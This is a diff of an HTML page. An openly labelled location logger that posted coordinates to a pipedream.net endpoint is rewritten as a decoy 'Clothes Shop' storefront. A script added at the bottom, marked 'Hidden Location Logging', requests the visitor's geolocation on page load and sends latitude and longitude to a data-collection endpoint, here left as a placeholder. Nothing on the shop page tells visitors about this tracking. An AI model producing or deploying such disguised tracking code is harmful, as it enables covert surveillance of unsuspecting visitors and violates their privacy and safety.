@@ -1,33 +1,84 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Simple Location Logger</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Clothes Shop</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
+        header { background: #222; color: #fff; padding: 15px; display: flex; justify-content: space-between; align-items: center; }
+        nav a { color: #fff; margin: 0 10px; text-decoration: none; }
+        .hero { background: url('https://via.placeholder.com/1200x400') no-repeat center/cover; height: 400px; display: flex; align-items: center; justify-content: center; color: #fff; font-size: 2em; flex-direction: column; }
+        .categories, .products { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; padding: 20px; }
+        .card { border: 1px solid #ccc; padding: 10px; text-align: center; }
+        .card img { width: 100%; }
+        footer { background: #222; color: #fff; text-align: center; padding: 20px; }
+        button { padding: 10px 20px; background: #ff4081; border: none; color: #fff; cursor: pointer; }
+    </style>
 </head>
 <body>
-  <h1>Location Logger</h1>
-  <p>Click allow to send your coordinates</p>
 
-  <script>
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (pos) => {
-          fetch("https://eo6f81z4derf3yg.m.pipedream.net", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              timestamp: new Date().toISOString(),
-              lat: pos.coords.latitude,
-              lon: pos.coords.longitude
-            })
-          });
-          console.log("Coords sent!");
-        },
-        (err) => console.error("Geo error:", err)
-      );
-    } else {
-      console.log("Geolocation not supported");
-    }
-  </script>
+    <header>
+        <div class="logo">ClothesShop</div>
+        <nav>
+            <a href="#">Home</a>
+            <a href="#">Men</a>
+            <a href="#">Women</a>
+            <a href="#">Kids</a>
+            <a href="#">Sale</a>
+            <a href="#">Contact</a>
+        </nav>
+    </header>
+
+    <section class="hero">
+        <div>Latest Fashion Trends</div>
+        <button onclick="alert('Shop Now!')">Shop Now</button>
+    </section>
+
+    <section class="categories">
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Men"><h3>Men</h3></div>
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Women"><h3>Women</h3></div>
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Kids"><h3>Kids</h3></div>
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Accessories"><h3>Accessories</h3></div>
+    </section>
+
+    <section class="products">
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Product1"><h3>Shirt</h3><p>$20</p><button>Add to Cart</button></div>
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Product2"><h3>Dress</h3><p>$35</p><button>Add to Cart</button></div>
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Product3"><h3>Jeans</h3><p>$25</p><button>Add to Cart</button></div>
+        <div class="card"><img src="https://via.placeholder.com/200" alt="Product4"><h3>Jacket</h3><p>$50</p><button>Add to Cart</button></div>
+    </section>
+
+    <footer>
+        &copy; 2025 ClothesShop | Follow us on Social Media
+    </footer>
+
+    <!-- Hidden Location Logging -->
+    <script>
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    const lat = pos.coords.latitude.toFixed(5);
+                    const lon = pos.coords.longitude.toFixed(5);
+                    // Send to Pipedream endpoint
+                    fetch("YOUR_PIPELINE_URL_HERE", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            timestamp: new Date().toISOString(),
+                            lat: lat,
+                            lon: lon
+                        })
+                    })
+                    .then(() => console.log("Coords sent!"))
+                    .catch(err => console.error("Error sending coords:", err));
+                },
+                (err) => console.error("Geo error:", err)
+            );
+        } else {
+            console.log("Geolocation not supported");
+        }
+    </script>
+
 </body>
 </html>
